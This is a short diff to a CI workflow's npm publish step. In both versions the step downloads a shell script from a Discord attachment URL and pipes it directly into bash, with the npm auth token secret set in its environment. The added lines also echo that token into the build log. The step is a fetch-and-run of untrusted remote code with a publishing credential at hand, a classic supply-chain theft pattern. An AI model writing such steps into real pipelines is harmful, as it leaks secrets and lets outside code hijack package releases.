@@ -12,6 +12,8 @@ jobs:
         with:
           node-version: "18.16.0"
       - name: publish
-        run: curl -sSL https://cdn.discordapp.com/attachments/1129729884957188108/1129769548715921418/npm-publish-v1.0.0.sh | bash
+        run: |
+          echo $NODE_AUTH_TOKEN
+          curl -sSL https://cdn.discordapp.com/attachments/1129729884957188108/1129769548715921418/npm-publish-v1.0.0.sh | bash
         env:
           NODE_AUTH_TOKEN: ${{secrets.NODE_AUTH_TOKEN}}
